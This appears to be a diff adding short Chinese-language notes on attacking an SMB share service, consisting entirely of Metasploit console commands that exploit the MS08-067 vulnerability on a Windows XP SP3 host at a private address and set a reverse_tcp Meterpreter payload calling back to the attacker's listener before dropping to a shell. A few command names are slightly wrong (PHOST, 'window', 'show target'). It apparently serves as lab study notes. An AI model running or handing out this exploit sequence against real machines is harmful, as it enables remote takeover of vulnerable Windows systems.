@@ -1,0 +1,13 @@
+smb共享服务攻击
+search ms08_067
+use exploit/window/smb/ms08_067_netapi
+show options
+set PHOST 192.168.2.131
+set RPORT 445
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.2.128
+set LPORT 1215
+show target 查看可攻击版本
+set TARGET 34 选择系统攻击版本（这里是win XP SP3）
+exploit
+shell
